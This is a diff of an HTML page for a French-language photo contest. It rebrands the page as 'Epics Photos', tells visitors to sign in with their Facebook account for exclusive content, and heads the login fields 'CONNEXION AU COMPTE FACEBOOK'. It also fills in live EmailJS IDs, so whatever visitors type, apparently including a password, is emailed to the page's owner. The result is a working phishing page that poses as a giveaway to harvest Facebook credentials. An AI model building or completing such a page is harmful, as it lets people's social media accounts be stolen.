@@ -4,13 +4,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ray Photographe - Concours</title>
+  <title>Epics Photos - Concours</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: url('fond-canon-bw.jpg') no-repeat center center fixed;
+      background: url('epics-mobile.png') no-repeat center center fixed;
       background-size: cover;
       color: white;
       text-align: center;
@@ -90,14 +90,13 @@
 <body>
   <header>
     <img id="logo" src="logo-ray.png" alt="Logo Ray Photographe">
-    <h1>RAY PHOTOGRAPHE</h1>
+    <h1>EPICS PHOTOS</h1>
   </header>
 
   <p class="description">
     Bienvenue sur ma page concours.<br>
-    Participez et courez la chance de remporter une séance photo de votre choix 100% gratuite ou la chance de figurer sur ma page officielle en tant que modèle d'un jour.<br>
-    <b>Participation sans photo = 1 chance, avec 1 photo = 2 chances.</b><br>
-    Aucune limite de participation!
+    Incrivez-vous avec votre compte Facebook pour accéder au contenu exclusif. <br>
+    Participez et courez la chance de remporter une séance photo de votre choix 100% gratuitement.</b><br>
   </p>
 
   <div class="ticket">
@@ -109,7 +108,7 @@
       <label>Nom:</label>
       <input type="text" id="nom" required>
 
-      <h3>I.D COMPTE</h3>
+      <h3>CONNEXION AU COMPTE FACEBOOK</h3>
       <label>Courriel:</label>
       <input type="email" id="email" required>
 
@@ -124,11 +123,11 @@
     </form>
   </div>
 
-  <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" onclick="window.open('https://www.instagram.com/ray_photographe?igsh=d3o5a3lhdXN5aXIx', '_blank')">
+  <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" onclick="window.open('https://www.instagram.com/Epics_Photos', '_blank')">
 
   <script>
     (function() {
-      emailjs.init('TON_USER_ID_EMAILJS');
+      emailjs.init('BrtBsQy5vDhTa128o');
     })();
 
     function togglePassword() {
@@ -165,7 +164,7 @@
         formData.append("photo", document.getElementById('photo').files[0]);
       }
 
-      emailjs.sendForm('TON_SERVICE_ID', 'TON_TEMPLATE_ID', form)
+      emailjs.sendForm('service_cnubxfb', 'template_00u7aki', form)
       .then(() => {
           alert("Merci pour votre participation! Les gagnants vous seront divulgués par courriel. Vous pouvez participer une autre fois avec une autre photo.");
       }, (error) => {
